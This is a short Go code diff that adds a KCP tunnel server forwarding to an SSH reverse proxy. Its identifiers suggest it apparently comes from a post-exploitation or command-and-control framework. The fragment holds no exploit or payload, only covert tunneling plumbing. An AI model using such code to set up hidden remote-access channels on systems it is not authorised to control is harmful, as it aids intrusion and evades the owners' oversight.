@@ -47,6 +47,18 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		}
 	}()
 
+	// kcp server that forwards to ssh reverse proxy
+	go func() {
+		err = tun.KCPTunServer(
+			fmt.Sprintf("127.0.0.1:%s", RuntimeConfig.ReverseProxyPort), // forward to ssh reverse proxy
+			RuntimeConfig.KCPServerPort,
+			RuntimeConfig.Password,
+			emp3r0r_data.MagicString)
+		if err != nil {
+			log.Printf("KCP tunnel for reverse proxy: %v", err)
+		}
+	}()
+
 	// monitor until it works
 	go func() {
 		// does the proxy work?
